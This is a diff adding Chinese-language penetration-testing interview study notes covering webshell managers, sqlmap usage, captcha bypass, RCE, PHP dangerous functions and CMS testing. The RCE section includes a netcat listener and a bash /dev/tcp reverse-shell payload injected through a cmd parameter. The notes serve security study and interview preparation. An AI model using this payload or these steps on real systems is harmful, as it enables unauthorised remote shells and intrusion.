@@ -1,0 +1,104 @@
+工具：
+
+简单介绍常用webshell管理工具？
+windows
+蚁剑、菜刀、冰蝎.....  webshell管理工具
+冰蝎有流量动态加密？？？
+（也可以自己写一个动态加密）
+
+常用渗透工具分系统回答？
+Windows：
+burp  流量分析、数据包分析
+nmap 端口扫描
+sqlmap 注入攻击测试
+awvs（整站扫描工具）
+aircrack-ng  无线攻击
+msf 综合攻击
+mimikatz 系统哈希，破解密码
+Nessus（漏洞扫描工具）
+Linux：
+burp
+appsan 
+awvs
+sqlmap
+fiddler（类似chales）
+
+xray综合扫描工具与burp联动？
+7：14
+1、powershell命令
+./xray_windows_386.exe webscan --listen 127.0.0.1:7777 --html-output x.html
+将配置放在config.yaml文件中
+2、打开burp
+user options--upstram proxy--add--des（*） host（127.0.0.1）port(7777)
+
+sqlmap对注入点进行注入命令？分get与post
+如何使用
+sqlmap -u url
+sqlmap -u url --data="post参数“
+sqlmap -r "数据包”针对cookie、http等渗透
+
+简述sqlmap --os-shell 原理？
+在mysql数据库中写入两个shell文件，一个执行命令，一个上传文件
+
+burp弱口令爆破遇到验证码问题？
+1、判断验证码类型
+前端--禁用js
+后端--伪随机数？token？
+php伪随机数（百度，查看是否有规律）
+python代码对接打码平台--绕过
+
+如何规范扫描器扫描到关键文件？
+1、被动抛出异常
+return text,404 
+扫描器捕获404状态，不会点进来看，来规范扫描
+2、主动抛出异常来规范扫描
+屏蔽此页面，不影响其他页面
+404、限流、防扫
+3、/admin   
+/manager
+起小名，规范扫描
+
+RCE漏洞：
+
+简述RCE漏洞原理？
+原理：直接调用系统命令，没有对特殊字符（& |）进行过滤
+
+如何使用RCE漏洞进行渗透？
+1、查看当前用户权限
+2、所在目录、用户类型
+3、是否可以写入一句话木马
+4、使用exp模块提权
+
+如何使用远程命令执行反弹nc？
+nc -lvv 8888
+?cmd=bash -i >& /dev/tcp/x.x.x.x/8888 0>&1
+
+php命令执行函数有哪些？（代码审计时可能会产生RCE漏洞函数）
+system   执行外部应用程序
+shell_exec    执行shell命令并返回输出字符串
+passthru    执行unix系统命令并显示原始输出
+exec    执行外部应用程序
+popen
+proc_open
+putenv
+assert
+eval
+在对php文件进行代码审计的时候要注意这些东西
+
+CMS渗透：
+CMS--content manage system
+如何对CMS进行渗透？
+编辑器版本--（新闻编辑界面）搜索对应漏洞、扫描敏感文件、扫描二级目录、知道站长是否对CMS有误操作（网站备份的压缩文件、网站说明文件、网站二级目录放在其他站点）
+
+对网站版本对比，进行代码审计
+CMS1.1  CMS1.2 
+文件代码审查，修改地方是漏洞补丁，文件对比
+
+为什么要审查上传点元素？
+确认是前端限制还是后端限制
+
+禁止注册用户渗透？
+找回密码--了解用户名是否存在--ajx无刷页面（和数据库有数据交互）
+
+登录界面会想到哪些漏洞？
+sql注入、xss+csrf、免密登录、弱口令爆破
